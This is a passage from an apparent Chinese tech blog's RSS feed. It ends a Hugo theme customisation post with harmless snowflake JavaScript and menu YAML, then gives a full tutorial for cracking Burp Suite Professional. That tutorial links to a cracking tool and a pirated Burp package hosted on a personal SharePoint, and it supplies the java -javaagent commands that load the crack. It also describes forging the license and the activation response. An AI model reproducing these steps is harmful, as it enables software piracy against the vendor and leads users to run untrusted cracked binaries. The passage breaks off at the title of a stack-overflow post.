            &lt;span class=&#34;nx&#34;&gt;fontSize&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;rand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;px&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;position&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;absolute&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;rand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;%&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;transition&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;transform &amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;speed&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;s linear&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;,opacity &amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;speed&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;s linear&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;translateY(-100%)&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;opacity&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0.3&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;setTimeout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;useStyle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;$snow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;nx&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;translate(0, &amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;getComputedStyle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;$canvas&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;height&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;) rotate(480deg)&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                &lt;span class=&#34;nx&#34;&gt;opacity&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;$snow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;addEventListener&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;transitionend&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;nx&#34;&gt;$snow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;remove&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;$canvas&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;appendChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;$snow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;interval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

    &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;rand&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;to&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;useStyle&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;dom&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sKey&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;dom&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

    &lt;span class=&#34;nx&#34;&gt;Config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;dom&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;appendChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;$canvas&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;})()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Linux下搞不了emoji?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;最简单的方式&lt;a class=&#34;link&#34; href=&#34;https://getemoji.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Ctrl C V&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;左侧快捷菜单自定义&#34;&gt;左侧快捷菜单自定义&lt;/h2&gt;
&lt;p&gt;修改网站更目录下配置文件&lt;code&gt;config.yaml&lt;/code&gt;即可&lt;/p&gt;
&lt;p&gt;去到&lt;code&gt;menu&lt;/code&gt;这边(176行?)&lt;/p&gt;
&lt;p&gt;利用以下格式添加/修改&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;- &lt;span class=&#34;nt&#34;&gt;identifier&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;名字&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;名字&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;/posts/&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;### Url里填要跳转的目录，注意这里/表示 网站根目录/content&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;weight&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;300&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;### weight是一个整数(最好填正数罢)数越大菜单项越在下面&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;          &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;icon&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;infinity&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;### icon(图标)位于网站根目录/themes/hugo-theme-stack/assets/icons/，输入不带后缀的文件名，当然你也可以自己添加图标&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;newTab&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;### newTab为true时点击会打开新标签页&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ref&#34;&gt;Ref&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mantyke.icu/2022/stack-theme-furnish03/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://mantyke.icu/2022/stack-theme-furnish03/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mantyke.icu/2021/a08f1963/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Hugo |另一篇Stack主题装修记录&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Burp Suite Professional 安装&#43;破解教程</title>
        <link>https://kira-pgr.github.io/posts/burppro/</link>
        <pubDate>Tue, 08 Feb 2022 07:42:01 -0500</pubDate>
        
        <guid>https://kira-pgr.github.io/posts/burppro/</guid>
        <description>&lt;img src="https://kira-pgr.github.io/posts/burppro/cover.jpg" alt="Featured image of post Burp Suite Professional 安装&#43;破解教程" /&gt;&lt;h1 id=&#34;burp-suite-professional-安装破解教程&#34;&gt;Burp Suite Professional 安装+破解教程&lt;/h1&gt;
&lt;p&gt;嗝~~&lt;/p&gt;
&lt;p&gt;&lt;del&gt;(Burp在英文中有打嗝的意思)&lt;/del&gt;&lt;/p&gt;
&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
&lt;p&gt;咳咳，先声明一下，当你看到这篇文章的时候，它很可能已经是 &lt;em&gt;&lt;strong&gt;过时&lt;/strong&gt;&lt;/em&gt; 的了= =,&lt;/p&gt;
&lt;p&gt;由于Burp会不断更新换代，本文章提供的软件安装包不可能提供最新安装包，如果你觉得版本太旧了，&lt;strong&gt;请自行网上搜索最新安装包&lt;/strong&gt;，但文章提供的破解工具 &lt;em&gt;应该&lt;/em&gt; 能保证在之后一段时间内有用&lt;/p&gt;
&lt;h2 id=&#34;资源&#34;&gt;资源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/EcxltDgxg55Lm1YNOAOk89kBQ4Ty7lKbFSfPMvRtZ0V1Mw?e=Slwzws&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;破解工具&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/ETCKDiiKZVNBrdTlXsEdtRoBVpL1zYDC340s62MAPH5KLA?e=ckzbZI&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Burp Suite Pro v2022.1&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;使用&#34;&gt;使用&lt;/h2&gt;
&lt;h3 id=&#34;java环境&#34;&gt;JAVA环境&lt;/h3&gt;
&lt;p&gt;运行Burp Suite Professional需要&lt;strong&gt;提前安装好java环境&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.java.com/download/ie_manual.jsp&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Windows Java下载&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Linux&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;deb系&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo apt install default-jdk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Red Hat&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo yum install java-版本号-openjdk-devel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.java.com/en/download/manual.jsp&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Linux Java下载&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;嗝开始破解&#34;&gt;嗝～～开始破解&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;注意：请把Burp的文件和破解工具放入同一个文件夹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;终端/cmd/你奇奇怪怪的命令行工具进入放有以上两个文件的目录&lt;/p&gt;
&lt;p&gt;先运行破解工具&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;java -jar burploader.jar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 176; 
			flex-basis: 423px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/burppro/1.png&#34; data-size=&#34;796x451&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/burppro/1.png&#34;
			width=&#34;796&#34;
			height=&#34;451&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/burppro/1_hude958c5b360fb8fb230f2ce450c616ef_44660_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/burppro/1_hude958c5b360fb8fb230f2ce450c616ef_44660_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;破解工具&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;破解工具&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里License Text随便填一些东西(&lt;strong&gt;这些东西之后会显示在你的Burp标题栏上&lt;/strong&gt;，&lt;del&gt;可以考虑搞些酷酷的东西&lt;/del&gt;)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;TIP: 如果你是JAVA 17+, 记得不要直接点旁边的RUN(要不然会报错)&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;JAVA17+的看这里&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;保留破解工具窗口，并终端输入&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;java -noverify -javaagent:burploader.jar --add-opens&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;java.desktop/javax.swing&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ALL-UNNAMED --add-opens&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;java.base/java.lang&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ALL-UNNAMED -jar burpsuite_pro_v2022.1.jar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果你是其他JAVA版本，Burp启动后提示你要加上xxx的JVM参数，参考以下命令格式&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;java -noverify -javaagent:burploader.jar 提示你要加上的参数 -jar burpsuite_pro_v2022.1.jar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;p&gt;把破解工具生成的Liscense(许可证)粘贴进Burp的许可证框框= =&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 252; 
			flex-basis: 607px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/burppro/2.png&#34; data-size=&#34;764x302&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/burppro/2.png&#34;
			width=&#34;764&#34;
			height=&#34;302&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/burppro/2_hu29a58fd9b1af39045aaffd6a8af2aaae_123384_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/burppro/2_hu29a58fd9b1af39045aaffd6a8af2aaae_123384_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;许可证框框嗝~~&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;许可证框框嗝~~&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;点击Next(下一步)后选择Manual Activation(人工激活)&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 145; 
			flex-basis: 350px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/burppro/3.png&#34; data-size=&#34;838x574&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/burppro/3.png&#34;
			width=&#34;838&#34;
			height=&#34;574&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/burppro/3_hu662f4b453037502af61e9051280d2ba7_101889_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/burppro/3_hu662f4b453037502af61e9051280d2ba7_101889_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;这应该灰常EASY&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;这应该灰常EASY&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后把Burp的Request复制粘贴进激活工具&lt;/p&gt;
&lt;p&gt;傻瓜教程：点击旁边的Copy Request按钮复制，然后粘贴进激活工具Request框&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 164; 
			flex-basis: 394px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/burppro/5.png&#34; data-size=&#34;955x581&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/burppro/5.png&#34;
			width=&#34;955&#34;
			height=&#34;581&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/burppro/5_hueed93c348322a78de358c60c3d39a4c4_120610_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/burppro/5_hueed93c348322a78de358c60c3d39a4c4_120610_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;QAQ = =&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;QAQ = =&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后把激活工具的Response(回复)复制粘贴进Burp的Response框&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 164; 
			flex-basis: 394px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/burppro/6.png&#34; data-size=&#34;955x581&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/burppro/6.png&#34;
			width=&#34;955&#34;
			height=&#34;581&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/burppro/6_hu6853f4ca6b82090ec00dd1d56430d62b_149977_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/burppro/6_hu6853f4ca6b82090ec00dd1d56430d62b_149977_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;操作与上一步类似&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;操作与上一步类似&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后不BUG的话就应该激活成功了.qwq.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 153; 
			flex-basis: 369px&#34;
	&gt;
	&lt;a href=&#34;https://kira-pgr.github.io/posts/burppro/7.png&#34; data-size=&#34;829x539&#34;&gt;
		&lt;img src=&#34;https://kira-pgr.github.io/posts/burppro/7.png&#34;
			width=&#34;829&#34;
			height=&#34;539&#34;
			srcset=&#34;https://kira-pgr.github.io/posts/burppro/7_hu4d686dcae0324c9334fd8193d0e0e634_88893_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/burppro/7_hu4d686dcae0324c9334fd8193d0e0e634_88893_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;激活成功&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;激活成功&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;ref&#34;&gt;Ref&lt;/h2&gt;
&lt;p&gt;部分图片来自https://github.com/hanshaze/burp&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PWN! PWN! PANG! Part3 --- 栈溢出基础</title>
        <link>https://kira-pgr.github.io/posts/pwn3/</link>
        <pubDate>Mon, 07 Feb 2022 07:51:10 -0500</pubDate>
        
